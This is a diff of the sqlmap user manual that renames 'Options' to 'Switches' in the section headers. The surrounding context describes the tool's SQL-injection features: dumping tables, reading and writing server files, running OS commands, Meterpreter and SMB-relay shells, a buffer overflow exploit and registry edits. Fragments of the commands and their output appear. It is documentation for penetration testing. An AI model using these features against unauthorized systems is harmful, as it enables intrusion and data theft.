-Options: <tt>-</tt><tt>-columns</tt>, <tt>-C</tt>, <tt>-T</tt> and <tt>-D</tt>
+Switches: <tt>-</tt><tt>-columns</tt>, <tt>-C</tt>, <tt>-T</tt> and <tt>-D</tt>
 
 <p>
 It is possible to enumerate the list of columns for a specific database
@@ -3637,7 +3101,7 @@ Table: users
 <sect2>Dump database table entries
 
 <p>
-Options: <tt>-</tt><tt>-dump</tt>, <tt>-C</tt>, <tt>-T</tt>, <tt>-D</tt>,
+Switches: <tt>-</tt><tt>-dump</tt>, <tt>-C</tt>, <tt>-T</tt>, <tt>-D</tt>,
 <tt>-</tt><tt>-start</tt>, <tt>-</tt><tt>-stop</tt>, <tt>-</tt><tt>-first</tt>
 and <tt>-</tt><tt>-last</tt>
 
@@ -3880,7 +3344,7 @@ column of a specific table entry.
 <sect2>Dump all databases tables entries
 
 <p>
-Options: <tt>-</tt><tt>-dump-all</tt> and <tt>-</tt><tt>-exclude-sysdbs</tt>
+Switches: <tt>-</tt><tt>-dump-all</tt> and <tt>-</tt><tt>-exclude-sysdbs</tt>
 
 <p>
 It is possible to dump all databases tables entries at once.
@@ -4007,7 +3471,7 @@ as a users' database.
 <sect2>Execute custom SQL statement
 
 <p>
-Options: <tt>-</tt><tt>-sql-query</tt> and <tt>-</tt><tt>-sql-shell</tt>
+Switches: <tt>-</tt><tt>-sql-query</tt> and <tt>-</tt><tt>-sql-shell</tt>
 
 <p>
 The SQL query and the SQL shell features makes the user able to execute
@@ -4385,7 +3849,7 @@ support when the back-end DBMS is PostgreSQL.
 <sect2>Inject custom user-defined functions (UDF)
 
 <p>
-Options: <tt>-</tt><tt>-udf-inject</tt> and <tt>-</tt><tt>-shared-lib</tt>
+Switches: <tt>-</tt><tt>-udf-inject</tt> and <tt>-</tt><tt>-shared-lib</tt>
 
 <p>
 You can inject your own user-defined functions (UDFs) by compiling a
@@ -4437,7 +3901,7 @@ via command line using <tt>-</tt><tt>-shared-lib</tt> option.
 <sect2>Read a file from the database server's file system
 
 <p>
-Option: <tt>-</tt><tt>-read-file</tt>
+Switch: <tt>-</tt><tt>-read-file</tt>
 
 <p>
 It is possible to retrieve the content of files from the underlying file
@@ -4561,7 +4025,7 @@ output/192.168.136.131/files/C__example.exe: PE32 executable for MS Windows (GUI
 <sect2>Write a local file on the database server's file system
 
 <p>
-Options: <tt>-</tt><tt>-write-file</tt> and <tt>-</tt><tt>-dest-file</tt>
+Switches: <tt>-</tt><tt>-write-file</tt> and <tt>-</tt><tt>-dest-file</tt>
 
 <p>
 It is possible to upload a local file to the database server file system
@@ -4642,7 +4106,7 @@ same size as the local file '/etc/passwd'
 <sect2>Execute arbitrary operating system command
 
 <p>
-Options: <tt>-</tt><tt>-os-cmd</tt> and <tt>-</tt><tt>-os-shell</tt>
+Switches: <tt>-</tt><tt>-os-cmd</tt> and <tt>-</tt><tt>-os-shell</tt>
 
 <p>
 It is possible to execute arbitrary commands on the underlying operating
@@ -4977,7 +4441,7 @@ wants to recreate them or keep them and save time.
 <sect2>Prompt for an out-of-band shell, Meterpreter or VNC
 
 <p>
-Options: <tt>-</tt><tt>-os-pwn</tt>, <tt>-</tt><tt>-priv-esc</tt>, <tt>-</tt><tt>-msf-path</tt> and <tt>-</tt><tt>-tmp-path</tt>
+Switches: <tt>-</tt><tt>-os-pwn</tt>, <tt>-</tt><tt>-priv-esc</tt>, <tt>-</tt><tt>-msf-path</tt> and <tt>-</tt><tt>-tmp-path</tt>
 
 <p>
 It is possible to establish an <bf>out-of-band stateful TCP connection
@@ -5248,7 +4712,7 @@ meterpreter > exit
 <sect2>One click prompt for an out-of-band shell, meterpreter or VNC
 
 <p>
-Options: <tt>-</tt><tt>-os-smbrelay</tt>, <tt>-</tt><tt>-priv-esc</tt> and <tt>-</tt><tt>-msf-path</tt>
+Switches: <tt>-</tt><tt>-os-smbrelay</tt>, <tt>-</tt><tt>-priv-esc</tt> and <tt>-</tt><tt>-msf-path</tt>
 
 <p>
 If the back-end database management system runs on Windows as
@@ -5404,7 +4868,7 @@ msf exploit(smb_relay) > exit
 <sect2>Database stored procedure heap-based buffer overflow exploit
 
 <p>
-Options: <tt>-</tt><tt>-os-bof</tt>, <tt>-</tt><tt>-priv-esc</tt> and <tt>-</tt><tt>-msf-path</tt>
+Switches: <tt>-</tt><tt>-os-bof</tt>, <tt>-</tt><tt>-priv-esc</tt> and <tt>-</tt><tt>-msf-path</tt>
 
 <p>
 If the back-end database management system is Microsoft SQL Server not
@@ -5527,7 +4991,7 @@ the needed privileges to access it.
 <sect2>Read a Windows registry key value
 
 <p>
-Option: <tt>-</tt><tt>-reg-read</tt>
+Switch: <tt>-</tt><tt>-reg-read</tt>
 
 <p>
 Using this option you can read registry key values.
@@ -5570,7 +5034,7 @@ Registry key value data:    'ProductName        REG_SZ  Microsoft Windows XP'
 <sect2>Write a Windows registry key value
 
 <p>
-Option: <tt>-</tt><tt>-reg-add</tt>
+Switch: <tt>-</tt><tt>-reg-add</tt>
 
 <p>
 Using this option you can write registry key values.
@@ -5610,7 +5074,7 @@ to modify the Windows registry.
 <sect2>Delete a Windows registry key
 
 <p>
-Option: <tt>-</tt><tt>-reg-del</tt>
+Switch: <tt>-</tt><tt>-reg-del</tt>
 
 <p>
 Using this option you can delete registry keys.
@@ -5651,7 +5115,7 @@ Windows registry.
 <sect2>Auxiliary registry switches
 
 <p>
-Options: <tt>-</tt><tt>-reg-key</tt>, <tt>-</tt><tt>-reg-value</tt>, 
+Switches: <tt>-</tt><tt>-reg-key</tt>, <tt>-</tt><tt>-reg-value</tt>, 
 <tt>-</tt><tt>-reg-data</tt> and <tt>-</tt><tt>-reg-type</tt>
 
 <p>
@@ -5682,7 +5146,7 @@ $ python sqlmap.py -u http://192.168.136.128/sqlmap/pgsql/get_int.php?id=1 --reg
 <sect2>Session file: save and resume all data retrieved
 
 <p>
-Option: <tt>-s</tt>
+Switch: <tt>-s</tt>
 
 <p>
 By default sqlmap logs all queries and their output into a text file while
@@ -5782,7 +5246,7 @@ banner:    'PostgreSQL 8.3.5 on i486-pc-linux-gnu, compiled by GCC gcc-4.3.real
 <sect2>Flush session file for current target
     
 <p>
-Option: <tt>-</tt><tt>-flush-session</tt>
+Switch: <tt>-</tt><tt>-flush-session</tt>
 
 <p>
 As you are already familiar with the concept of a session file from the
@@ -5797,7 +5261,7 @@ sqlmap. Other possible way is the manual removing of session file(s),
 <sect2>Estimated time of arrival
 
 <p>
-Option: <tt>-</tt><tt>-eta</tt>
+Switch: <tt>-</tt><tt>-eta</tt>
 
 <p>
 It is possible to calculate and show the estimated time of arrival to
@@ -5867,7 +5331,7 @@ counts the number of retrieved query output characters.
 <sect2>Use Google dork results from specified page number
 
 <p>
-Option: <tt>-</tt><tt>-gpage</tt>
+Switch: <tt>-</tt><tt>-gpage</tt>
 
 <p>
 Default sqlmap behavior with option <tt>-g</tt> is to do a Google
@@ -5908,7 +5372,7 @@ do you want to test this url? [Y/n/q]
 <sect2>Update sqlmap
 
 <p>
-Option: <tt>-</tt><tt>-update</tt>
+Switch: <tt>-</tt><tt>-update</tt>
 
 <p>
 Using this option you can update the program to the latest version
@@ -5937,7 +5401,7 @@ a source package (gzip, bzip2 or zip) to use this feature.
 <sect2>Save options in a configuration INI file
 
 <p>
-Option: <tt>-</tt><tt>-save</tt>
+Switch: <tt>-</tt><tt>-save</tt>
 
 <p>
 It is possible to save the command line options to a configuration INI
@@ -6094,7 +5558,7 @@ banner:    'PostgreSQL 8.3.5 on i486-pc-linux-gnu, compiled by GCC gcc-4.3.real
 <sect2>Act in non-interactive mode
 
 <p>
-Option: <tt>-</tt><tt>-batch</tt>
+Switch: <tt>-</tt><tt>-batch</tt>
 
 <p>
 If you want sqlmap to run as a batch tool, without any user's interaction 
@@ -6144,7 +5608,7 @@ vulnerable parameter.
 <sect2>Cleanup the DBMS by sqlmap specific UDF(s) and table(s)
 
 <p>
-Option: <tt>-</tt><tt>-cleanup</tt>
+Switch: <tt>-</tt><tt>-cleanup</tt>
 
 <p>
 It is recommended to clean up the back-end database management system from
